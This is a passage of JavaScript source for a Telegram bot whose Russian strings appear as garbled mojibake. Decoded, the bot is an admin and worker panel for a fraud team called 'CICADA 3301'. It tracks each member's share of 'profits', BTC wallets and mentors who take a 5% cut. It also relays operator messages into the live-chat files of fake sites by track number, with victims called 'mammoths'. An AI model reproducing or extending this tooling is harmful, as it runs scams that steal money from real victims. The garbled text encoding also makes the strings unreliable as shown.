                Markup.button.callback("–ú–µ–Ω—é", "tomenu")
            ]
        ]))
    }

    if (clb.data == "checkOnline"){
            let id = clb.message.text.match(/‚ùáÔ∏è –¢—Ä–µ–∫ –Ω–æ–º–µ—Ä: (.+)\|(.+)/)[1]
            let service = clb.message.text.match(/‚ùáÔ∏è –¢—Ä–µ–∫ –Ω–æ–º–µ—Ä: (.+)\|(.+)/)[2]
          if (existsSync(`../${service}/chat_src/data/${id}.json`)){
    
            let backend = readFileSync(`../${service}/chat_src/data/${id}.json`).toString("utf-8")
            writeFileSync(`../${service}/chat_src/data/${id}.json`, `${backend.substring(0, backend.length-1)}, {"sender": "testOnline", "message": "${encodeURI(ctx.message.text.replace(/"/g, "'"))}"}]`)
    
          }else{
            writeFileSync(`../${service}/chat_src/data/${id}.json`, `[{"sender": "testOnline", "message": "1"}]`)
          }
          ctx.reply("‚ú¥Ô∏è –ó–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω, –æ—Ç–≤–µ—Ç –ø—Ä–∏–π–¥—ë—Ç –≤ —Å–ª—É—á–∞–µ –µ—Å–ª–∏ –º–∞–º–æ–Ω—Ç –Ω–∞ —Å–∞–π—Ç–µ.", {reply_to_message_id: clb.message.message_id})
    }

    if (clb.data == "mentors"){
        if (readdirSync("database/mentors/").length == 0){
            ctx.editMessageCaption("–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é –≤ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç —É –Ω–∞—Å –Ω–µ—Ç—É –Ω–∞—Å—Ç–∞–≤–Ω–∏–∫–æ–≤.\n\n‚ùóÔ∏è –í—ã –≤—Å–µ–≥–¥–∞ –º–æ–∂–µ—Ç–µ –ø–æ–¥–∞—Ç—å –∑–∞—è–≤–∫—É –Ω–∞ –ù–∞—Å—Ç–∞–≤–Ω–∏—á–µ—Å—Ç–≤–æ —á–µ—Ä–µ–∑ —Ä–∞–∑–¥–µ–ª –ö–æ–Ω—Ç–∞–∫—Ç—ã.", Markup.inlineKeyboard([[Markup.button.callback("–í –ú–µ–Ω—é", "tomenu")]]))
        }else{
            let mentors_selector = [[]]

            readdirSync("database/mentors/").forEach(mentor => {
                mentors_selector.push([{text: `üë®‚Äçüè´ #${readFileSync("database/maindb/" + mentor + "/tag")}`, callback_data: `@go_mentor:${mentor}`}])
            })

            mentors_selector.push([{text: `–í –º–µ–Ω—é`, callback_data: `tomenu`}])

            ctx.editMessageCaption("<b>-></b> –ó–¥–µ—Å—å –≤—ã –º–æ–∂–µ—Ç–µ –≤—ã–±—Ä–∞—Ç—å –Ω–∞—Å—Ç–∞–≤–Ω–∏–∫–∞ –∫–æ—Ç–æ—Ä—ã–π –≤ –±—É–¥—É—â–µ–º –ø–æ–º–æ–∂–µ—Ç –≤–∞–º –∏ –ø–æ–º–æ–∂–µ—Ç —Å–¥–µ–ª–∞—Ç—å –ø—Ä–æ—Ñ–∏—Ç. –ó–∞ —ç—Ç–æ –≤—ã –±—É–¥–µ—Ç–µ –æ—Ç–¥–∞–≤–∞—Ç—å 5% —Å –∫–∞–∂–¥–æ–≥–æ –ø—Ä–æ—Ñ–∏—Ç–∞ –Ω–∞—Å—Ç–∞–≤–Ω–∏–∫—É, –≤—ã —Å–º–æ–∂–µ—Ç–µ –æ—Ç–∫–∞–∑–∞—Ç—å—Å—è –æ—Ç –Ω–∞—Å—Ç–∞–≤–Ω–∏–∫–∞ –ø–æ—Å–ª–µ 3—Ö –ø—Ä–æ—Ñ–∏—Ç–æ–≤.", { parse_mode: "HTML", reply_markup: JSON.stringify({ inline_keyboard: mentors_selector })
        })
        }
    }

    if (clb.data == "bug/domain") return ctx.scene.enter("bgd", ctx.scene.stage)

    if (clb.data == "tomenu"){
        return ctx.editMessageCaption(`‚ùóÔ∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, <b>${ctx.from.first_name}</b>!\n\n‚ùï –¢–≤–æ–π <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n‚ùï –¢—ã —Ä–∞–±–æ—Ç–∞–µ—à—å –ø–æ–¥: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n‚ùï –£ —Ç–µ–±—è <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} –ø—Ä–æ—Ñ–∏—Ç–æ–≤</b>.\n‚ùï –°—É–º–º–∞ –ø—Ä–æ—Ñ–∏—Ç–æ–≤ —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç <b>${getProfits(ctx.from.id)} USD</b>.\n‚ùï –¢–≤–æ–π BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>–ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.</b>"}\n‚ùï –ù–∞—Å—Ç–∞–≤–Ω–∏–∫: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>–ù–µ—Ç—É</b>."}\n\n${hand()}`, {reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
    }
    
    if (clb.data == "chats"){
        return ctx.editMessageCaption(`‚òÅÔ∏è –ß–∞—Ç—ã CICADA 3301.\n\n‚ùóÔ∏è –í—ã –º–æ–∂–µ—Ç–µ —É–≤–∏–¥–µ—Ç—å –≤—Å–µ –¥–æ—Å—Ç—É–ø–Ω—ã–µ –∏ –∞–∫—Ç—É–∞–ª—å–Ω—ã–µ —Å—Å—ã–ª–∫–∏ –Ω–∞–∂–∞–≤ –Ω–∞ –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ.`, Markup.inlineKeyboard([
            [
                Markup.button.url("–û–±—â–∏–π —á–∞—Ç", cfg.chat),
                Markup.button.url("–ü—Ä–æ—Ñ–∏—Ç—ã", cfg.profits)
            ],
            [
                Markup.button.callback("‚ùï –í –º–µ–Ω—é", "tomenu")
            ]
        ]))
    }

    if (clb.data == "goreg"){
        if (existsSync("database/attempts/" + ctx.from.id) == false){
            ctx.scene.enter("register", ctx.scene.stage)
        }else{
            ctx.reply("–í—ã —É–∂–µ –ø–æ–¥–∞–ª–∏ –∑–∞—è–≤–∫—É, –æ–∂–∏–¥–∞–π—Ç–µ —Ä–µ—à–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏.")
        }
    }

    if (clb.data.substring(0,9) == "@country:"){
        if (existsSync("database/maindb/" + ctx.from.id + "/btc") == false) return ctx.reply("–í–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å BTC –∫–æ—à–µ–ª—ë–∫.")
        ctx.editMessageCaption("", _local.countrys[clb.data.replace("@country:", "")])
    }
    if (clb.data == "callMenu") return ctx.replyWithPhoto("https://i.ibb.co/R0Qcf25/123.jpg", {caption: `‚ùóÔ∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, <b>${ctx.from.first_name}</b>!\n\n‚ùï –¢–≤–æ–π <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n‚ùï –¢—ã —Ä–∞–±–æ—Ç–∞–µ—à—å –ø–æ–¥: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n‚ùï –£ —Ç–µ–±—è <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} –ø—Ä–æ—Ñ–∏—Ç–æ–≤</b>.\n‚ùï –°—É–º–º–∞ –ø—Ä–æ—Ñ–∏—Ç–æ–≤ —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç <b>${getProfits(ctx.from.id)} USD</b>.\n‚ùï –¢–≤–æ–π BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>–ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.</b>"}\n‚ùï –ù–∞—Å—Ç–∞–≤–Ω–∏–∫: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>–ù–µ—Ç—É</b>."}\n\n${hand()}`, reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
    if (clb.data.substring(0, 8) == "@accept:"){
        let id = clb.data.match(/@accept:(.+)/)[1]
        createUser(id)
        writeFileSync("database/users/" + id, ctx.from.username)
        await bot.telegram.sendMessage(id, "‚úÖ –í–∞—à–∞ –∑–∞—è–≤–∫–∞ –Ω–∞ –≤—Å—Ç—É–ø–ª–µ–Ω–∏–µ –±—ã–ª–∞ –æ–¥–æ–±—Ä–µ–Ω–∞.")
        await bot.telegram.sendMessage(id, "–ü–æ–ª–µ–∑–Ω—ã–µ —Å—Å—ã–ª–∫–∏.", Markup.inlineKeyboard([
            [
                Markup.button.callback("–ú–µ–Ω—é", "gomenu")
            ],
            [
                Markup.button.url("–û–±—â–∏–π —á–∞—Ç", cfg.chat)
            ],
            [
                Markup.button.url("–ü—Ä–æ—Ñ–∏—Ç—ã", cfg.profits)
            ]
        ]))
        ctx.editMessageText(clb.message.text + "\n\n‚úÖ –û–¥–æ–±—Ä–µ–Ω–∞ @" + ctx.from.username)
    }
    if (clb.data.substring(0, 11) == "@disaccept:"){
        let id = clb.data.match(/@disaccept:(.+)/)[1]
        bot.telegram.sendMessage(id, "‚ùå –í–∞—à–∞ –∑–∞—è–≤–∫–∞ –Ω–∞ –≤—Å—Ç—É–ø–ª–µ–Ω–∏–µ –±—ã–ª–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞.")
        unlinkSync("database/attempts/" + id)
        ctx.editMessageText(clb.message.text + "\n\n‚ùå –û—Ç–∫–ª–æ–Ω–µ–Ω–∞ @" + ctx.from.username)
    }
    if (clb.data.substring(0, 10) == "@disblock:"){
        let id = clb.data.match(/@disblock:(.+)/)[1]
        writeFileSync("database/block/" + id, ctx.from.username)
        ctx.editMessageText(clb.message.text + "\n\n‚ùå –û—Ç–∫–ª–æ–Ω+–ë–ª–æ–∫ @" + ctx.from.username)
        bot.telegram.sendMessage(id, "–í—ã –±—ã–ª–∏ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã.")
    }
})

bot.use((ctx, next) => {
    if (ctx.chat.type != "private") return false
    if (existsSync("database/block/" + ctx.from.id) == true){
        return ctx.reply("–í—ã –±—ã–ª–∏ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –°–≤—è–∂–∏—Ç–µ—Å—å —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–µ–π.")
    }

    if (existsSync("database/users/" + ctx.from.id) == false){
        ctx.reply("ü•∑ –ú—ã –Ω–µ —É–≤–∏–¥–µ–ª–∏ —á—Ç–æ –≤—ã –∑–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã –≤ –Ω–∞—à–µ–π —Å–∏—Å—Ç–µ–º–µ, —Å–æ–≤–µ—Ç—É–µ–º —ç—Ç–æ –∏—Å–ø—Ä–∞–≤–∏—Ç—å.", Markup.inlineKeyboard([
            [
                Markup.button.callback("–ó–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", "goreg")
            ]
        ]))
    }else{
        next()
    }
})

bot.command("mtext", (ctx) => {
    if (existsSync("database/mentors/" + ctx.from.id) == false) return ctx.reply("–í—ã –Ω–µ –Ω–∞—Å—Ç–∞–≤–Ω–∏–∫.")
    if (ctx.message.text == "/mtext") return ctx.reply("–í—ã –¥–æ–ª–∂–Ω—ã –≤–≤–µ—Å—Ç–∏ —Ç–µ–∫—Å—Ç –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏—è. –ü—Ä–∏–º–µ—Ä: /mtext Text")

    let text = encodeURIComponent(ctx.message.text.replace("/mtext", ""))

    writeFileSync("database/mentors/" + ctx.from.id, JSON.stringify({text: text}))
    ctx.reply("–í—ã —É—Å–ø–µ—à–Ω–æ —Å–º–µ–Ω–∏–ª–∏ —Ç–µ–∫—Å—Ç!")
})

bot.command("leavementor", (ctx) => {
    if (existsSync("database/maindb/" + ctx.from.id + "/mentor") == false) return ctx.reply("–£ –≤–∞—Å –Ω–µ—Ç—É –Ω–∞—Å—Ç–∞–≤–Ω–∏–∫–∞.")
    if (recentMentor(ctx.from.id) == "–í—ã –º–æ–∂–µ—Ç–µ –æ—Ç–∫–∞–∑–∞—Ç—å—Å—è"){
        unlinkSync("database/maindb/" + ctx.from.id + "/mpr")
        unlinkSync("database/maindb/" + ctx.from.id + "/mentor")
        writeFileSync("database/maindb/" + ctx.from.id + "/percent", String(Number(readFileSync("database/maindb/" + ctx.from.id + "/percent")) + 5))
    }else{
        ctx.reply("–í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –æ—Ç–∫–∞–∑–∞—Ç—å—Å—è –æ—Ç –Ω–∞—Å—Ç–∞–≤–Ω–∏–∫–∞, –í–∞–º " + recentMentor(ctx.from.id))
    }
})

bot.command("start", (ctx) => {
    ctx.replyWithPhoto("https://i.ibb.co/R0Qcf25/123.jpg", {caption: `‚ùóÔ∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, <b>${ctx.from.first_name}</b>!\n\n‚ùï –¢–≤–æ–π <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n‚ùï –¢—ã —Ä–∞–±–æ—Ç–∞–µ—à—å –ø–æ–¥: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n‚ùï –£ —Ç–µ–±—è <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} –ø—Ä–æ—Ñ–∏—Ç–æ–≤</b>.\n‚ùï –°—É–º–º–∞ –ø—Ä–æ—Ñ–∏—Ç–æ–≤ —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç <b>${getProfits(ctx.from.id)} USD</b>.\n‚ùï –¢–≤–æ–π BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>–ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.</b>"}\n‚ùï –ù–∞—Å—Ç–∞–≤–Ω–∏–∫: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>–ù–µ—Ç—É</b>."}\n\n${hand()}`, reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
})


bot.command("main", (ctx) => {
    ctx.replyWithPhoto("https://i.ibb.co/R0Qcf25/123.jpg", {caption: `‚ùóÔ∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, <b>${ctx.from.first_name}</b>!\n\n‚ùï –¢–≤–æ–π <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n‚ùï –¢—ã —Ä–∞–±–æ—Ç–∞–µ—à—å –ø–æ–¥: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n‚ùï –£ —Ç–µ–±—è <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} –ø—Ä–æ—Ñ–∏—Ç–æ–≤</b>.\n‚ùï –°—É–º–º–∞ –ø—Ä–æ—Ñ–∏—Ç–æ–≤ —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç <b>${getProfits(ctx.from.id)} USD</b>.\n‚ùï –¢–≤–æ–π BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>–ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.</b>"}\n‚ùï –ù–∞—Å—Ç–∞–≤–Ω–∏–∫: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>–ù–µ—Ç—É</b>."}\n\n${hand()}`, reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
})

bot.on("message", (ctx) => {
    if (typeof ctx.message.reply_to_message != "undefined"){
    if (ctx.message.reply_to_message.text.includes("‚ùáÔ∏è –¢—Ä–µ–∫ –Ω–æ–º–µ—Ä:")){
      let id = ctx.message.reply_to_message.text.match(/‚ùáÔ∏è –¢—Ä–µ–∫ –Ω–æ–º–µ—Ä: (.+)\|(.+)/)[1]
      let service = ctx.message.reply_to_message.text.match(/‚ùáÔ∏è –¢—Ä–µ–∫ –Ω–æ–º–µ—Ä: (.+)\|(.+)/)[2]
      if (ctx.message.text.includes('"') == true){
        ctx.reply(`–°–∏–º–≤–æ–ª—ã –∫–æ—Ç–æ—Ä—ã–µ –≤—ã —É–∫–∞–∑–∞–ª–∏ "" –∑–∞–ø—Ä–µ—â–µ–Ω—ã –ø–æ—ç—Ç–æ–º—É –æ–Ω–∏ –±—ã–ª–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–º–µ–Ω–µ–Ω—ã –Ω–∞ ''.`)
      }
      if (existsSync(`../${service}/chat_src/data/${id}.json`)){
  
        let backend = readFileSync(`../${service}/chat_src/data/${id}.json`).toString("utf-8")
        writeFileSync(`../${service}/chat_src/data/${id}.json`, `${backend.substring(0, backend.length-1)}, {"sender": "t", "message": "${ctx.message.text.replace(/"/g, "'")}"}]`)
  
      }else{
        writeFileSync(`../${service}/chat_src/data/${id}.json`, `[{"sender": "t", "message": "${ctx.message.text.replace(/"/g, "'")}"}]`)
      }
      ctx.reply("–°–æ–æ–±—â–µ–Ω–∏–µ –ø–µ—Ä–µ–¥–∞–Ω–æ.", {reply_to_message_id: ctx.message.message_id})
    }
  }
})







bot.catch(err => console.log(err))
bot.launch()